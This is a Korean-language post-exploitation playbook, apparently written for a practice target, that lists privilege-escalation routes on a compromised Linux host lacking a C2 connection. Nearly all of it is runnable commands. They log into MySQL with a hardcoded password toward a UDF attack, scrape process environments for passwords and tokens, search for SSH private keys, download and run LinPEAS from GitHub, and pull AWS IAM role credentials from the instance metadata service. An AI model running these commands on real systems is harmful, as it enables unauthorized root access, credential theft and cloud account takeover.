# 대안 권한 상승 방법 (파일 전송 없이)

C2 서버와 파일 전송이 안되므로 타겟에서 직접 실행 가능한 방법들

---

## 현재 상황
- ✅ wget 있음
- ❌ curl 없음
- ❌ nc 없음
- ❌ C2 서버 연결 안됨
- ❌ sudo 비밀번호 모름
- ❌ /etc/passwd writable 아님
- ❌ docker 없음

---

## 방법 1: Python 확인 후 exploit 직접 작성

### 타겟에서:

```bash
which python3
python3 --version
which python
python --version
```

**Python이 있으면 바로 사용 가능!**

---

## 방법 2: MySQL UDF 권한 상승 (재시도)

MySQL에 접근 가능하므로 이게 가장 유망합니다.

### 타겟에서:

```bash
cd /tmp

# MySQL plugin 디렉토리 확인
mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@plugin_dir;"
mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@secure_file_priv;"

# MySQL 버전
mysql -u webuser -p'WebPassw0rd!' -e "SELECT VERSION();"

# 현재 사용자 권한
mysql -u webuser -p'WebPassw0rd!' -e "SELECT user, host, Super_priv, File_priv FROM mysql.user WHERE user='webuser';"

# 플러그인 확인
mysql -u webuser -p'WebPassw0rd!' -e "SELECT * FROM mysql.func;"
```

---

## 방법 3: Python exploit 직접 작성 (CVE-2023-32233)

Python이 있다면 Python으로 같은 exploit 작성 가능

### 타겟에서:

```bash
python3 << 'PYEOF'
import os
import sys

print("[*] Checking kernel version...")
with open('/proc/version', 'r') as f:
    print(f.read())

print("[*] Checking for nf_tables module...")
with open('/proc/modules', 'r') as f:
    for line in f:
        if 'nf_tables' in line:
            print(f"[+] Found: {line.strip()}")

print("[*] This is a simplified check")
print("[!] Full exploit requires C compilation")
PYEOF
```

---

## 방법 4: Splunk 확인 (root로 실행되면 악용 가능)

### 타겟에서:

```bash
# Splunk 프로세스 확인
ps aux | grep splunk | grep -v grep

# Splunk 디렉토리
ls -la /opt/splunk* 2>/dev/null

# Splunk 설정 파일
find /opt/splunk* -name "*.conf" 2>/dev/null | head -10

# Splunk가 root로 실행되는지
ps aux | grep splunk | grep root
```

**Splunk가 root로 실행되면:**

```bash
# Splunk app 디렉토리
ls -la /opt/splunkforwarder/etc/apps/

# writable인지 확인
find /opt/splunkforwarder -writable -type d 2>/dev/null | head -10
```

---

## 방법 5: Cron Jobs 재확인

### 타겟에서:

```bash
# Cron 파일들
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/* 2>/dev/null

# 사용자 crontab
crontab -l 2>/dev/null

# writable cron 스크립트
find /etc/cron* -writable 2>/dev/null
find /var/spool/cron -writable 2>/dev/null

# /etc/cron.d writable?
test -w /etc/cron.d && echo "WRITABLE!"
```

---

## 방법 6: 환경 변수 / 프로세스 메모리

### 타겟에서:

```bash
# 모든 프로세스의 환경 변수 확인
for pid in /proc/[0-9]*; do
    if [ -r "$pid/environ" ]; then
        echo "=== $pid ==="
        cat "$pid/environ" 2>/dev/null | tr '\0' '\n' | grep -i "pass\|key\|secret\|token" | head -5
    fi
done 2>/dev/null | grep -B1 -i "pass"

# cmdline도 확인
for pid in /proc/[0-9]*; do
    cat "$pid/cmdline" 2>/dev/null | tr '\0' '\n' | grep -i "pass"
done 2>/dev/null | head -20
```

---

## 방법 7: 다른 사용자로 pivot

### 타겟에서:

```bash
# 시스템 사용자 확인
cat /etc/passwd | grep -v "nologin\|false" | grep -v "^#"

# 홈 디렉토리
ls -la /home/

# ec2-user 존재?
ls -la /home/ec2-user/ 2>/dev/null

# SSH 키
find /home -name "id_rsa" -o -name "*.pem" 2>/dev/null
find /home -name "authorized_keys" 2>/dev/null

# 읽기 가능한 .ssh 디렉토리
find /home -type d -name ".ssh" -readable 2>/dev/null
```

---

## 방법 8: 외부 exploit-db 직접 다운로드

타겟에서 직접 외부 인터넷 접근 가능한지 확인:

```bash
# 인터넷 연결 확인
ping -c 3 8.8.8.8

# exploit-db 접근
wget https://www.exploit-db.com/ -O /tmp/test.html 2>/dev/null
cat /tmp/test.html | head -20

# GitHub raw 접근
wget https://raw.githubusercontent.com/torvalds/linux/master/README -O /tmp/readme.txt 2>/dev/null
cat /tmp/readme.txt | head -10
```

**인터넷 접근 가능하면:**

```bash
cd /tmp

# LinPEAS 재실행 (외부에서 직접)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas2.sh 2>/dev/null
chmod +x linpeas2.sh
./linpeas2.sh 2>&1 | tee linpeas_full.txt

# 중요 부분만 확인
grep -i "privilege\|writable\|password" linpeas_full.txt | head -50
```

---

## 방법 9: 웹 애플리케이션 재확인

### 타겟에서:

```bash
# 웹 디렉토리
ls -la /var/www/html/
find /var/www/html -name "*.php" -type f 2>/dev/null | head -20

# 관리자 페이지
find /var/www/html -name "*admin*" 2>/dev/null
find /var/www/html -name "*upload*" 2>/dev/null

# 설정 파일에서 비밀번호 찾기
grep -r "password\|passwd\|pwd" /var/www/html --include="*.php" 2>/dev/null | grep -v ".jpg\|.png" | head -30
```

---

## 방법 10: AWS 메타데이터 새로 가져오기

### 타겟에서:

```bash
# IMDSv2 토큰 생성
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)

echo "Token: $TOKEN"

# Role 이름
ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)

echo "Role: $ROLE"

# 새 크레덴셜
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null

# 크레덴셜 파싱
CREDS=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null)

echo $CREDS | python3 -m json.tool
```

---

## 🎯 즉시 실행 순서

### 1단계: Python 확인

```bash
which python3
python3 --version
```

### 2단계: MySQL 상세 확인

```bash
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns << 'MYSQLEOF'
SELECT @@plugin_dir;
SELECT @@secure_file_priv;
SELECT VERSION();
SELECT user, host, Super_priv, File_priv FROM mysql.user;
SHOW GRANTS FOR 'webuser'@'localhost';
MYSQLEOF
```

### 3단계: Splunk 확인

```bash
ps aux | grep splunk | grep root
ls -la /opt/splunk* 2>/dev/null
```

### 4단계: 프로세스 메모리 확인

```bash
for pid in /proc/[0-9]*; do
    cat "$pid/environ" 2>/dev/null | tr '\0' '\n' | grep -i "pass"
done | head -20
```

### 5단계: 외부 인터넷 확인

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/lp.sh 2>/dev/null
chmod +x /tmp/lp.sh
./lp.sh 2>&1 | grep -i "privilege\|writable"
```

---

## 가장 유망한 방법

1. **MySQL UDF** - 이미 DB 접근 가능
2. **Splunk** - root로 실행되면 즉시 권한 상승
3. **외부 LinPEAS** - 새로운 벡터 찾기
4. **프로세스 메모리** - 비밀번호/키 찾기

---

## 다음 명령어 복사 (타겟에서)

```bash
# 한번에 체크
echo "=== Python ==="
which python3
echo ""

echo "=== MySQL ==="
mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@plugin_dir; SELECT @@secure_file_priv;"
echo ""

echo "=== Splunk ==="
ps aux | grep splunk | grep root
echo ""

echo "=== Internet ==="
ping -c 2 8.8.8.8
echo ""
```
